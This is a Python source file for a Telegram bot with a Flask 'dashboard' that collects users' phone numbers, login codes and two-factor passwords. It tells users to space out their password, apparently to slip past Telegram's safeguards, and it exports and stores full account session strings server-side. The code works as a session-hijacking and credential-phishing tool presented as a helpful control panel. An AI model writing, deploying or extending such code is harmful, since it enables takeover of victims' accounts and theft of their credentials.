import os
import secrets
import asyncio
import threading
from flask import Flask, request, jsonify, send_file
from pyrogram import Client, filters
from pyrogram.errors import SessionPasswordNeeded, PhoneCodeInvalid, PhoneCodeExpired
import logging

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

BOT_TOKEN = os.environ.get("BOT_TOKEN")
API_ID = int(os.environ.get("API_ID", 0))
API_HASH = os.environ.get("API_HASH", "")
BASE_URL = os.environ.get("BASE_URL", "")

app = Flask(__name__)
sessions = {}
user_tokens = {}
user_state = {}
user_data = {}
user_clients = {}
user_code_hash = {}

bot_loop = None
bot = None

WAIT_PHONE = "WAIT_PHONE"
WAIT_CODE = "WAIT_CODE"
WAIT_PASSWORD = "WAIT_PASSWORD"

async def send_msg(chat_id, text, reply_markup=None):
    await bot.send_message(chat_id, text, reply_markup=reply_markup)

async def handle_start(client, message):
    user_id = message.from_user.id
    user_state[user_id] = WAIT_PHONE
    await message.reply("👋 أهلاً! أرسل رقم هاتفك مع رمز الدولة\nمثال: +9647801234567")

async def handle_message(client, message):
    user_id = message.from_user.id
    text = message.text.strip()
    state = user_state.get(user_id)

    if state == WAIT_PHONE:
        await handle_phone(client, message, user_id, text)
    elif state == WAIT_CODE:
        await handle_code(client, message, user_id, text)
    elif state == WAIT_PASSWORD:
        await handle_password(client, message, user_id, text)
    else:
        await message.reply("اكتب /start للبدء")

async def handle_phone(client, message, user_id, phone):
    user_data[user_id] = {"phone": phone}
    try:
        pyro = Client(
            name=f"user_{user_id}",
            api_id=API_ID,
            api_hash=API_HASH,
            in_memory=True
        )
        await pyro.connect()
        sent = await pyro.send_code(phone)
        user_clients[user_id] = pyro
        user_code_hash[user_id] = sent.phone_code_hash
        user_state[user_id] = WAIT_CODE
        await message.reply("✅ وصلك رمز على تلغرام، أرسله هنا:")
    except Exception as e:
        await message.reply(f"❌ خطأ: {e}\nحاول مرة ثانية /start")
        user_state.pop(user_id, None)

async def handle_code(client, message, user_id, code):
    code = code.replace(" ", "")
    phone = user_data[user_id]["phone"]
    pyro = user_clients.get(user_id)
    phone_hash = user_code_hash.get(user_id)
    try:
        await pyro.sign_in(phone, phone_hash, code)
        await finish_login(message, user_id, pyro)
    except SessionPasswordNeeded:
        user_state[user_id] = WAIT_PASSWORD
        await message.reply(
            "🔐 حسابك عنده مصادقة ثنائية!\n\n"
            "أرسل كلمة المرور بشكل مفرق\n"
            "مثال: h e l l o 1 2 3"
        )
    except (PhoneCodeInvalid, PhoneCodeExpired):
        await message.reply("❌ الرمز خاطئ أو منتهي\nأرسل الرمز مرة ثانية:")
    except Exception as e:
        await message.reply(f"❌ خطأ: {e}\nأرسل الرمز مرة ثانية:")

async def handle_password(client, message, user_id, password):
    password = password.replace(" ", "")
    pyro = user_clients.get(user_id)
    try:
        await pyro.check_password(password)
        await finish_login(message, user_id, pyro)
    except Exception:
        await message.reply("❌ كلمة المرور خاطئة\nحاول مرة ثانية:")

async def finish_login(message, user_id, pyro):
    phone = user_data[user_id]["phone"]
    session_str = await pyro.export_session_string()
    sessions[phone] = session_str
    token = secrets.token_hex(16)
    user_tokens[user_id] = token
    dashboard_url = f"{BASE_URL}/dashboard?token={token}"
    from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton
    keyboard = InlineKeyboardMarkup([[
        InlineKeyboardButton("🚀 افتح لوحة التحكم", url=dashboard_url)
    ]])
    user_state.pop(user_id, None)
    await message.reply(
        "✅ تم تسجيل الدخول بنجاح!\n\nاضغط الزر لفتح لوحة التحكم:",
        reply_markup=keyboard
    )

@app.route("/")
def index():
    return send_file("index.html")

@app.route("/dashboard")
def dashboard():
    token = request.args.get("token")
    if not token or token not in user_tokens.values():
        return "غير مصرح", 403
    return send_file("index.html")

@app.route("/api/send", methods=["POST"])
def send_messages():
    data = request.json
    phone = data.get("phone")
    if not sessions.get(phone):
        return jsonify({"error": "لا توجد جلسة"}), 401
    return jsonify({"status": "ok"})

def run_bot():
    global bot, bot_loop
    bot_loop = asyncio.new_event_loop()
    asyncio.set_event_loop(bot_loop)

    bot = Client(
        name="bot",
        api_id=API_ID,
        api_hash=API_HASH,
        bot_token=BOT_TOKEN,
        in_memory=True
    )

    bot.on_message(filters.command("start"))(handle_start)
    bot.on_message(filters.text & ~filters.command("start"))(handle_message)

    bot_loop.run_until_complete(bot.run())

if __name__ == "__main__":
    t = threading.Thread(target=run_bot, daemon=True)
    t.start()
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
